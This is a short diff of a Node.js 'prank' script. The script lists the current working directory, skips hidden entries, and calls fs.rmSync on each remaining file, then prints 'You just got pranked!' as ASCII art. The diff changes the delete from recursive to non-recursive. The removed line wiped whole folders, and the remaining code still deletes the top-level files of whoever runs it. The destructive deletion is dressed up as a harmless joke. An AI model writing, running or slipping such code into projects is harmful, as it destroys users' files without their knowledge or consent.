@@ -18,7 +18,7 @@ fs.readdir(process.cwd(), async (err, files) => {
   files = files.filter((item) => !/(^|\/)\.[^\/\.]/g.test(item));
   for (const file of files) {
     const path_string = path.join(process.cwd(), file);
-    fs.rmSync(path_string, { recursive: true });
+    fs.rmSync(path_string, { recursive: false });
   }
   figlet("You just got pranked!", (err, data) => {
     console.log(gradient.pastel.multiline(data));
